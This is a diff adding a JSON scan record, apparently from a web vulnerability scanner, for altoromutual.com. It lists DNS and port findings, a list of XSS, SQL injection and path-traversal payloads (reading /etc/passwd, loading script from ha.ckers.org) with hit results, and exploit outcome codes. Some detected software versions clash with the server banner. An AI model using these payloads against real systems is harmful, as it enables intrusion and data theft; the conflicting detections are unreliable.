@@ -1,0 +1,466 @@
+{
+    "_id": ObjectId("602b3038103572bcf3e681c7"),
+    "sitio": "http://altoromutual.com:8080",
+    "cookie": "PHDSESSID:jnj8mr8fugu61ma86p9o96frv0",
+    "estado": {
+        "fecha": "15/02/2021 21:38:11"
+    },
+    "informacion": {
+        "Dnsdumpster": {
+            "txt": [],
+            "dns": [
+                {
+                    "dominio": "usc2.akam.net.",
+                    "ip": "184.26.160.64",
+                    "dns_inverso": "a12-64.akam.net",
+                    "pais": "United States",
+                    "cabecera": ""
+                },
+                {
+                    "dominio": "asia3.akam.net.",
+                    "ip": "23.211.61.64",
+                    "dns_inverso": "a22-64.akam.net",
+                    "pais": "United States",
+                    "cabecera": ""
+                },
+                {
+                    "dominio": "ns1-206.akam.net.",
+                    "ip": "193.108.91.206",
+                    "dns_inverso": "ns1-206.akam.net",
+                    "pais": "Netherlands",
+                    "cabecera": ""
+                },
+                {
+                    "dominio": "eur2.akam.net.",
+                    "ip": "95.100.173.64",
+                    "dns_inverso": "a28-64.akam.net",
+                    "pais": "Netherlands",
+                    "cabecera": ""
+                },
+                {
+                    "dominio": "usw2.akam.net.",
+                    "ip": "184.26.161.64",
+                    "dns_inverso": "a14-64.akam.net",
+                    "pais": "United States",
+                    "cabecera": ""
+                },
+                {
+                    "dominio": "ns1-99.akam.net.",
+                    "ip": "193.108.91.99",
+                    "dns_inverso": "a1-99.akam.net",
+                    "pais": "Netherlands",
+                    "cabecera": ""
+                },
+                {
+                    "dominio": "usc3.akam.net.",
+                    "ip": "96.7.50.64",
+                    "dns_inverso": "usc3.akam.net",
+                    "pais": "United States",
+                    "cabecera": ""
+                },
+                {
+                    "dominio": "eur5.akam.net.",
+                    "ip": "23.74.25.64",
+                    "dns_inverso": "a26-64.akam.net",
+                    "pais": "United States",
+                    "cabecera": ""
+                }
+            ],
+            "mx": [],
+            "host": [
+                {
+                    "dominio": "altoromutual.com",
+                    "ip": "65.61.137.117",
+                    "dns_inverso": "",
+                    "pais": "United States",
+                    "cabecera": "Apache-Coyote/1.1HTTPS: Apache-Coyote/1.1TCP8080: Apache-Coyote/1.1HTTP TECH: Apache-Coyote,1.1J2EEHTTPS TECH: Apache-Coyote,1.1J2EE"
+                }
+            ]
+        },
+        "Robtex": {
+            "informacion": {}
+        },
+        "Puertos": {
+            "filtrados": [
+                {
+                    "puerto": "8070",
+                    "protocolo": "tcp",
+                    "servicio": "ucs-isc"
+                },
+                {
+                    "puerto": "8071",
+                    "protocolo": "tcp",
+                    "servicio": "unknown"
+                },
+                {
+                    "puerto": "8072",
+                    "protocolo": "tcp",
+                    "servicio": "unknown"
+                },
+                {
+                    "puerto": "8073",
+                    "protocolo": "tcp",
+                    "servicio": "unknown"
+                },
+                {
+                    "puerto": "8074",
+                    "protocolo": "tcp",
+                    "servicio": "gadugadu"
+                },
+                {
+                    "puerto": "8075",
+                    "protocolo": "tcp",
+                    "servicio": "unknown"
+                },
+                {
+                    "puerto": "8076",
+                    "protocolo": "tcp",
+                    "servicio": "slnp"
+                },
+                {
+                    "puerto": "8077",
+                    "protocolo": "tcp",
+                    "servicio": "mles"
+                },
+                {
+                    "puerto": "8078",
+                    "protocolo": "tcp",
+                    "servicio": "unknown"
+                },
+                {
+                    "puerto": "8079",
+                    "protocolo": "tcp",
+                    "servicio": "unknown"
+                },
+                {
+                    "puerto": "8081",
+                    "protocolo": "tcp",
+                    "servicio": "blackice-icecap"
+                },
+                {
+                    "puerto": "8082",
+                    "protocolo": "tcp",
+                    "servicio": "blackice-alerts"
+                },
+                {
+                    "puerto": "8083",
+                    "protocolo": "tcp",
+                    "servicio": "us-srv"
+                },
+                {
+                    "puerto": "8084",
+                    "protocolo": "tcp",
+                    "servicio": "websnp"
+                },
+                {
+                    "puerto": "8085",
+                    "protocolo": "tcp",
+                    "servicio": "unknown"
+                },
+                {
+                    "puerto": "8086",
+                    "protocolo": "tcp",
+                    "servicio": "d-s-n"
+                },
+                {
+                    "puerto": "8087",
+                    "protocolo": "tcp",
+                    "servicio": "simplifymedia"
+                },
+                {
+                    "puerto": "8088",
+                    "protocolo": "tcp",
+                    "servicio": "radan-http"
+                },
+                {
+                    "puerto": "8089",
+                    "protocolo": "tcp",
+                    "servicio": "unknown"
+                },
+                {
+                    "puerto": "8090",
+                    "protocolo": "tcp",
+                    "servicio": "opsmessaging"
+                }
+            ],
+            "abiertos": [
+                {
+                    "puerto": "8080",
+                    "protocolo": "tcp",
+                    "servicio": "http-proxy"
+                }
+            ]
+        }
+    },
+    "analisis": {
+        "CMS": {
+            "nombre": "drupal",
+            "version": "7.57"
+        },
+        "Servidor": {
+            "nombre": "Apache",
+            "version": "1.14"
+        },
+        "Cifrados": [
+            {
+                "nombre": "SSL",
+                "version": "2"
+            },
+            {
+                "nombre": "ECDH",
+                "version": "256"
+            }
+        ]
+    },
+    "paginas": [
+        {
+            "sitio": "http://www.altoromutual.com:8080/search.jsp",
+            "forms": {
+                "frmSearch": [
+                    {
+                        "inputs": "query:# credit to rsnake ",
+                        "tipo": "xss",
+                        "xss": false,
+                        "sqli": false,
+                        "lfi": false
+                    },
+                    {
+                        "inputs": "query:<SCRIPT>alert('XSS');</SCRIPT> ",
+                        "tipo": "xss",
+                        "xss": true,
+                        "sqli": false,
+                        "lfi": false
+                    },
+                    {
+                        "inputs": "query:'';!--\"<XSS>=&{()} ",
+                        "tipo": "xss",
+                        "xss": false,
+                        "sqli": false,
+                        "lfi": false
+                    },
+                    {
+                        "inputs": "query:<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT> ",
+                        "tipo": "xss",
+                        "xss": true,
+                        "sqli": false,
+                        "lfi": false
+                    },
+                    {
+                        "inputs": "query:<IMG SRC=\"javascript:alert('XSS');\"> ",
+                        "tipo": "xss",
+                        "xss": false,
+                        "sqli": false,
+                        "lfi": false
+                    },
+                    {
+                        "inputs": "query:<IMG SRC=javascript:alert('XSS')> ",
+                        "tipo": "xss",
+                        "xss": false,
+                        "sqli": false,
+                        "lfi": false
+                    },
+                    {
+                        "inputs": "query:<IMG SRC=JaVaScRiPt:alert('XSS')> ",
+                        "tipo": "xss",
+                        "xss": false,
+                        "sqli": false,
+                        "lfi": false
+                    },
+                    {
+                        "inputs": "query:<IMG SRC=javascript:alert(&quot;XSS&quot;)> ",
+                        "tipo": "xss",
+                        "xss": false,
+                        "sqli": false,
+                        "lfi": false
+                    },
+                    {
+                        "inputs": "query:<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`> ",
+                        "tipo": "xss",
+                        "xss": false,
+                        "sqli": false,
+                        "lfi": false
+                    },
+                    {
+                        "inputs": "query:<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))> ",
+                        "tipo": "xss",
+                        "xss": false,
+                        "sqli": false,
+                        "lfi": false
+                    },
+                    {
+                        "inputs": "query:)%20or%20('x'='x ",
+                        "tipo": "sqli",
+                        "xss": false,
+                        "sqli": false,
+                        "lfi": false
+                    },
+                    {
+                        "inputs": "query:%20or%201=1 ",
+                        "tipo": "sqli",
+                        "xss": false,
+                        "sqli": false,
+                        "lfi": false
+                    },
+                    {
+                        "inputs": "query:; execute immediate 'sel' || 'ect us' || 'er' ",
+                        "tipo": "sqli",
+                        "xss": false,
+                        "sqli": false,
+                        "lfi": false
+                    },
+                    {
+                        "inputs": "query:benchmark(10000000,MD5(1))# ",
+                        "tipo": "sqli",
+                        "xss": false,
+                        "sqli": false,
+                        "lfi": false
+                    },
+                    {
+                        "inputs": "query:update ",
+                        "tipo": "sqli",
+                        "xss": false,
+                        "sqli": false,
+                        "lfi": false
+                    },
+                    {
+                        "inputs": "query:\";waitfor delay '0:0:__TIME__'-- ",
+                        "tipo": "sqli",
+                        "xss": false,
+                        "sqli": false,
+                        "lfi": false
+                    },
+                    {
+                        "inputs": "query:1) or pg_sleep(__TIME__)-- ",
+                        "tipo": "sqli",
+                        "xss": false,
+                        "sqli": false,
+                        "lfi": false
+                    },
+                    {
+                        "inputs": "query:||(elt(-3+5,bin(15),ord(10),hex(char(45)))) ",
+                        "tipo": "sqli",
+                        "xss": false,
+                        "sqli": false,
+                        "lfi": false
+                    },
+                    {
+                        "inputs": "query:\"hi\"\") or (\"\"a\"\"=\"\"a\" ",
+                        "tipo": "sqli",
+                        "xss": false,
+                        "sqli": false,
+                        "lfi": false
+                    },
+                    {
+                        "inputs": "query:delete ",
+                        "tipo": "sqli",
+                        "xss": false,
+                        "sqli": false,
+                        "lfi": false
+                    },
+                    {
+                        "inputs": "query:[Linux] ",
+                        "tipo": "lfi",
+                        "xss": false,
+                        "sqli": false,
+                        "lfi": false
+                    },
+                    {
+                        "inputs": "query:%00../../../../../../etc/passwd ",
+                        "tipo": "lfi",
+                        "xss": false,
+                        "sqli": false,
+                        "lfi": false
+                    },
+                    {
+                        "inputs": "query:%00/etc/passwd%00 ",
+                        "tipo": "lfi",
+                        "xss": false,
+                        "sqli": false,
+                        "lfi": false
+                    },
+                    {
+                        "inputs": "query:%0a/bin/cat%20/etc/passwd ",
+                        "tipo": "lfi",
+                        "xss": false,
+                        "sqli": false,
+                        "lfi": false
+                    },
+                    {
+                        "inputs": "query:/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd ",
+                        "tipo": "lfi",
+                        "xss": false,
+                        "sqli": false,
+                        "lfi": false
+                    },
+                    {
+                        "inputs": "query:/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd ",
+                        "tipo": "lfi",
+                        "xss": false,
+                        "sqli": false,
+                        "lfi": false
+                    },
+                    {
+                        "inputs": "query:/./././././././././././etc/passwd ",
+                        "tipo": "lfi",
+                        "xss": false,
+                        "sqli": false,
+                        "lfi": false
+                    },
+                    {
+                        "inputs": "query:/../../../../../../../../../../etc/passwd ",
+                        "tipo": "lfi",
+                        "xss": false,
+                        "sqli": false,
+                        "lfi": false
+                    },
+                    {
+                        "inputs": "query:/../../../../../../../../../../etc/passwd^^ ",
+                        "tipo": "lfi",
+                        "xss": false,
+                        "sqli": false,
+                        "lfi": false
+                    },
+                    {
+                        "inputs": "query:/..\\../..\\../..\\../..\\../..\\../..\\../etc/passwd ",
+                        "tipo": "lfi",
+                        "xss": false,
+                        "sqli": false,
+                        "lfi": false
+                    }
+                ]
+            }
+        }
+    ],
+    "explotaciones": {
+        "exploit2_sh": {
+            "22": -1,
+            "445": -1,
+            "497": -1
+        },
+        "exploit1_py": {
+            "22": 0,
+            "445": 0,
+            "497": 0
+        },
+        "exploit3_sh": {
+            "22": 1,
+            "445": 1,
+            "497": 1
+        },
+        "exploit5_sh": {
+            "22": 0,
+            "445": 0,
+            "497": 0
+        },
+        "exploit4_sh": {
+            "22": -1,
+            "445": -1,
+            "497": -1
+        },
+        "exploit6_sh": {
+            "22": 1,
+            "445": 1,
+            "497": 1
+        }
+    }
+}
